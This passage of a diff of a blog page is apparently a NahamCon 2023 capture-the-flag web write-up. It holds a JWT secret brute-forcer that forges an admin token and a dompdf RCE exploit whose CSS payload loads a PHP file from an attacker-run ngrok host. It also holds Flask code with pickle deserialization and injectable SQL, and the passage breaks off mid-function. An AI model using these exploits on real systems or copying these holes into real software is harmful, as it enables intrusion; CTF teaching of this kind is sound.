+</span></span><span class="line"><span class="cl">        <span class="n">secret_key</span> <span class="o">=</span> <span class="n">known_secret_key</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">combination</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">check_token</span> <span class="o">=</span> <span class="n">create_jwt_token</span><span class="p">(</span><span class="s2">&#34;saad&#34;</span><span class="p">,</span> <span class="n">secret_key</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">original_jwt_token</span> <span class="o">=</span> <span class="s2">&#34;eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InNhYWQifQ.N87s9fHVZzgaytkjwri3MQ&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">check_token</span> <span class="o">==</span> <span class="n">original_jwt_token</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">              <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Found original key: </span><span class="si">{</span><span class="n">secret_key</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="n">secret_key</span>
+</span></span><span class="line"><span class="cl">              
+</span></span><span class="line"><span class="cl">        <span class="n">progress_bar</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">progress_bar</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Secret Key not found!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">partial_secret_key</span> <span class="o">=</span> <span class="s2">&#34;fsrwjcfszeg&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">original_secret_key</span> <span class="o">=</span> <span class="n">brute_force_secret_key</span><span class="p">(</span><span class="n">partial_secret_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;JWT Token of admin: &#34;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">create_jwt_token</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="n">original_secret_key</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/nahamcon2023-web/31.png" title="Brute-forced key and admin token" data-thumbnail="/nahamcon2023-web/31.png" data-sub-html="<h2>Brute-forced key and admin token</h2><p>Brute-forced key and admin token</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/31.png"
+            data-srcset="/nahamcon2023-web/31.png, /nahamcon2023-web/31.png 1.5x, /nahamcon2023-web/31.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/31.png" width="1366" height="108" />
+    </a><figcaption class="image-caption">Brute-forced key and admin token</figcaption>
+    </figure></p>
+<p>Change the token, you&rsquo;ll be logged in as <code>admin</code> and get the flag.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/32.png" title="Marmalade 5 Flag" data-thumbnail="/nahamcon2023-web/32.png" data-sub-html="<h2>Marmalade 5 Flag</h2><p>Marmalade 5 Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/32.png"
+            data-srcset="/nahamcon2023-web/32.png, /nahamcon2023-web/32.png 1.5x, /nahamcon2023-web/32.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/32.png" width="1366" height="490" />
+    </a><figcaption class="image-caption">Marmalade 5 Flag</figcaption>
+    </figure></p>
+<p><code>Flag: flag{a249dff54655158c25ddd3584e295c3b}</code></p>
+<h2 id="stickers">Stickers</h2>
+<p><strong>Description</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/45.png" title="Stickers" data-thumbnail="/nahamcon2023-web/45.png" data-sub-html="<h2>Stickers</h2><p>Stickers</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/45.png"
+            data-srcset="/nahamcon2023-web/45.png, /nahamcon2023-web/45.png 1.5x, /nahamcon2023-web/45.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/45.png" width="1054" height="429" />
+    </a><figcaption class="image-caption">Stickers</figcaption>
+    </figure></p>
+<p><strong>Solution</strong></p>
+<p>We get a stickers application in which we can enter <code>organisation name</code>, <code>email</code> and <code>number of stickers</code> to generate a pdf mentioning the total price of the stickers.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/46.png" title="Landing page" data-thumbnail="/nahamcon2023-web/46.png" data-sub-html="<h2>Landing Page</h2><p>Landing page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/46.png"
+            data-srcset="/nahamcon2023-web/46.png, /nahamcon2023-web/46.png 1.5x, /nahamcon2023-web/46.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/46.png" width="1366" height="583" />
+    </a><figcaption class="image-caption">Landing Page</figcaption>
+    </figure></p>
+<p>Upon submitting we get a nice looking PDF with our input values reflected.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/47.png" title="Stickers pdf" data-thumbnail="/nahamcon2023-web/47.png" data-sub-html="<h2>Sticker pdf</h2><p>Stickers pdf</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/47.png"
+            data-srcset="/nahamcon2023-web/47.png, /nahamcon2023-web/47.png 1.5x, /nahamcon2023-web/47.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/47.png" width="1361" height="575" />
+    </a><figcaption class="image-caption">Sticker pdf</figcaption>
+    </figure></p>
+<p>Analyzing the pdf with <code>pdfinfo</code> we see it&rsquo;s using <code>dompdf 1.2</code>.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/48.png" title="pdfinfo" data-thumbnail="/nahamcon2023-web/48.png" data-sub-html="<h2>pdfinfo</h2><p>pdfinfo</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/48.png"
+            data-srcset="/nahamcon2023-web/48.png, /nahamcon2023-web/48.png 1.5x, /nahamcon2023-web/48.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/48.png" width="438" height="339" />
+    </a><figcaption class="image-caption">pdfinfo</figcaption>
+    </figure></p>
+<p>Upon looking for exploits for dompdf, there was a RCE vulnerability applicable on the same version.</p>
+<p><a href="https://positive.security/blog/dompdf-rce" target="_blank" rel="noopener noreffer ">This</a> post explains the vulnerability really well so I&rsquo;ll only discuss about it briefly.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>dompdf RCE<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Dompdf versions &lt;1.2. 1 are vulnerable to Remote Code Execution (RCE) by injecting CSS into the data. The file can be tricked into storing a malicious font with a . php file extension in its font cache, which can later be executed by accessing it from the web.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://github.com/rvizx/CVE-2022-28368" target="_blank" rel="noopener noreffer ">https://github.com/rvizx/CVE-2022-28368</a></p>
+<p>To make the exploit work, we first need to take a valid <code>.ttf</code> file and change the extension to <code>.php</code>. This approach is the actual way to exploit it but for some reason if I was using any <code>.ttf</code> file and append the <code>php</code> in it then it was showing parsing errors.</p>
+<p>So I tried looking for POCs and <a href="https://github.com/positive-security/dompdf-rce" target="_blank" rel="noopener noreffer ">this</a> one&rsquo;s php file worked without any errors.</p>
+<p>Git clone the above repo and <code>cd</code> into the <code>exploit</code> folder.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/49.png" title="git repo" data-thumbnail="/nahamcon2023-web/49.png" data-sub-html="<h2>git repo</h2><p>git repo</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/49.png"
+            data-srcset="/nahamcon2023-web/49.png, /nahamcon2023-web/49.png 1.5x, /nahamcon2023-web/49.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/49.png" width="490" height="73" />
+    </a><figcaption class="image-caption">git repo</figcaption>
+    </figure></p>
+<p>Start a <code>ngrok</code> server and put its IP into the <code>exploit.css</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="p">@</span><span class="k">font-face</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">font-family</span><span class="o">:</span><span class="s1">&#39;exploitfont&#39;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">src</span><span class="p">:</span><span class="nd">url</span><span class="o">(</span><span class="s1">&#39;&lt;YOUR_ngrok_IP&gt;/exploit_font.php&#39;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">font-weight</span><span class="o">:</span><span class="s1">&#39;normal&#39;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">font-style</span><span class="o">:</span><span class="s1">&#39;normal&#39;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Contents of <code>exploit_font.php</code> are as follows.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/50.png" title="exploit_font.php" data-thumbnail="/nahamcon2023-web/50.png" data-sub-html="<h2>exploit_font.php</h2><p>exploit_font.php</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/50.png"
+            data-srcset="/nahamcon2023-web/50.png, /nahamcon2023-web/50.png 1.5x, /nahamcon2023-web/50.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/50.png" width="558" height="277" />
+    </a><figcaption class="image-caption">exploit_font.php</figcaption>
+    </figure></p>
+<p>I&rsquo;ll append another line to print the flag from <code>/</code> directory.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/51.png" title="appending flag read" data-thumbnail="/nahamcon2023-web/51.png" data-sub-html="<h2>appending flag read</h2><p>appending flag read</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/51.png"
+            data-srcset="/nahamcon2023-web/51.png, /nahamcon2023-web/51.png 1.5x, /nahamcon2023-web/51.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/51.png" width="628" height="56" />
+    </a><figcaption class="image-caption">appending flag read</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/52.png" title="updated exploit_font.php" data-thumbnail="/nahamcon2023-web/52.png" data-sub-html="<h2>updated exploit_font.php</h2><p>updated exploit_font.php</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/52.png"
+            data-srcset="/nahamcon2023-web/52.png, /nahamcon2023-web/52.png 1.5x, /nahamcon2023-web/52.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/52.png" width="561" height="274" />
+    </a><figcaption class="image-caption">updated exploit_font.php</figcaption>
+    </figure></p>
+<p>Now while generating the PDF in the web application, put the value of organisation parameter as follows.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">stylesheet</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&lt;YOUR_ngrok_IP&gt;/exploit.css&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, submit the request.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/53.png" title="Generated pdf" data-thumbnail="/nahamcon2023-web/53.png" data-sub-html="<h2>Generated pdf</h2><p>Generated pdf</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/53.png"
+            data-srcset="/nahamcon2023-web/53.png, /nahamcon2023-web/53.png 1.5x, /nahamcon2023-web/53.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/53.png" width="1366" height="553" />
+    </a><figcaption class="image-caption">Generated pdf</figcaption>
+    </figure></p>
+<p>Now extract the <code>md5</code> sum of the <code>exploit_font.php</code> file as follows.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/54.png" title="md5 of exploit_font.php" data-thumbnail="/nahamcon2023-web/54.png" data-sub-html="<h2>md5 of exploit_font.php</h2><p>md5 of exploit_font.php</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/54.png"
+            data-srcset="/nahamcon2023-web/54.png, /nahamcon2023-web/54.png 1.5x, /nahamcon2023-web/54.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/54.png" width="672" height="67" />
+    </a><figcaption class="image-caption">md5 of exploit_font.php</figcaption>
+    </figure></p>
+<p>Finally visit the following URL to get the flag.</p>
+<p><code>http://challenge.nahamcon.com:30473/dompdf/lib/fonts/exploitfont_normal_b54a59dd45adebff7cce9df9a7f53c75.php</code></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/55.png" title="Stickers flag" data-thumbnail="/nahamcon2023-web/55.png" data-sub-html="<h2>Stickers flag</h2><p>Stickers flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/55.png"
+            data-srcset="/nahamcon2023-web/55.png, /nahamcon2023-web/55.png 1.5x, /nahamcon2023-web/55.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/55.png" width="1366" height="579" />
+    </a><figcaption class="image-caption">Stickers flag</figcaption>
+    </figure></p>
+<p><code>Flag: flag{a4d52beabcfdeb6ba79fc08709bb5508}</code></p>
+<h2 id="transfer">Transfer</h2>
+<p><strong>Description</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/33.png" title="Transfer" data-thumbnail="/nahamcon2023-web/33.png" data-sub-html="<h2>Transfer</h2><p>Transfer</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/33.png"
+            data-srcset="/nahamcon2023-web/33.png, /nahamcon2023-web/33.png 1.5x, /nahamcon2023-web/33.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/33.png" width="1051" height="420" />
+    </a><figcaption class="image-caption">Transfer</figcaption>
+    </figure></p>
+<p>This was one of the coolest web challenges that I&rsquo;ve solved. It was hard for me so I had to look at hints and writeups to better understand the code.</p>
+<p><strong>Solution</strong></p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/34.png" title="Landing Page" data-thumbnail="/nahamcon2023-web/34.png" data-sub-html="<h2>Landing Page</h2><p>Landing Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/34.png"
+            data-srcset="/nahamcon2023-web/34.png, /nahamcon2023-web/34.png 1.5x, /nahamcon2023-web/34.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/34.png" width="1366" height="588" />
+    </a><figcaption class="image-caption">Landing Page</figcaption>
+    </figure></p>
+<p>This challenge also provides the source code so we&rsquo;ll analyze that first.</p>
+<p>The app.py has several routes so we&rsquo;ll go through the important ones.</p>
+<p>Take a look at the <code>GET /download/&lt;filename&gt;/&lt;sessionid&gt;</code> route.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/download/&lt;filename&gt;/&lt;sessionid&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">sessionid</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT * FROM activesessions WHERE sessionid=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">sessionid</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">active_session</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">active_session</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;No active session found&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT data FROM files WHERE filename=?&#34;</span><span class="p">,(</span><span class="n">filename</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">file_data</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file_data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;File not found&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">file_blob</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">file_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">file_blob</span><span class="p">),</span> <span class="n">download_name</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In this route, it first checks if there&rsquo;s an active session exists.</p>
+<p><strong>active sessions query</strong>
+<code>c.execute(f&quot;SELECT * FROM activesessions WHERE sessionid=?&quot;, (sessionid,))</code></p>
+<p>If this query returns a valid result, it then checks for a specific file.</p>
+<p><strong>file loading query</strong>
+<br>
+<code>c.execute(f&quot;SELECT data FROM files WHERE filename=?&quot;,(filename,))</code></p>
+<p>If the file data exists as well then we get to the <code>file_blob</code> part.</p>
+<p>Here it calls <code>pickle.loads()</code> on the <code>file_data</code> fetched earlier.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>pickle.loads()<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The risks associated with pickle.loads() are due to the fact that it can execute arbitrary Python code during the deserialization process. If an attacker can control the pickle data, they can potentially craft a payload that executes malicious code when the data is deserialized using pickle.loads().</div>
+        </div>
+    </div>
+<p>We saw that it calls <code>pickle.loads()</code> on the contents of the file fetched from the db. If we can somehow inject RCE Payload on the file and call this API, then it will execute our payload and we can get the shell on the system.</p>
+<p>How can we inject the payload into the file?</p>
+<p>Let&rsquo;s look at the <code>/login</code> endpoint.</p>
+<p><code>POST /login</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login_user</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">DBClean</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">DBClean</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password=&#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT sessionid FROM activesessions WHERE username=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">active_session</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">active_session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">session_id</span> <span class="o">=</span> <span class="n">active_session</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT username FROM users WHERE username=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">user_name</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">user_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">session_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">                <span class="n">c</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;INSERT INTO activesessions (sessionid, timestamp) VALUES (&#39;</span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s2">&#39;, &#39;</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S.</span><span class="si">%f</span><span class="s1">&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#39;)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;A session could be not be created&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">logout</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;session_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">session_id</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Username or password is incorrect&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This route takes in a <code>username</code> and <code>password</code>, then passes it to the SQL query to check if the user exists.</p>
+<p>Notice that it first passes the params through <code>DBClean</code> function.</p>
+<p><code>DBClean function</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">DBClean</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
